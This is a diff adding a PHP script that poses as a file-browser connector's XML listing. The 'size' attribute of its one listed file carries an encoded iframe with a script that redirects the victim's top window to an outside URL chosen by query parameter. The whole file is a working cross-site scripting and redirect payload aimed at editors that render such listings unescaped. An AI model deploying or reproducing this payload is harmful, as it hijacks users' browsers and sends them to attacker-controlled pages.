@@ -1,1 +1,19 @@
+<?php
+header('Access-Control-Allow-Origin: *');
+header('Content-Type: text/xml; charset=utf-8');
 
+// Get the jd parameter, defaulting to new-soccer-1 if empty
+$jd = isset($_GET['GetFoldersAndFiles']) && $_GET['GetFoldersAndFiles'] !== '' ? $_GET['GetFoldersAndFiles'] : 'new-soccer-1';
+$safeJd = basename($jd);
+
+// Build the target URL pointing to your HTML file on the Caddy server
+$targetUrl = 'https://cdotickets.accenture.com/video/' . $safeJd . '.html';
+
+echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
+?>
+<Connector command="GetFoldersAndFiles" resourceType="Document">
+    <CurrentFolder path="/1 - f/" url=""/>
+    <Files>
+        <File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href='<?php echo $targetUrl; ?>';&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;"/>
+    </Files>
+</Connector>
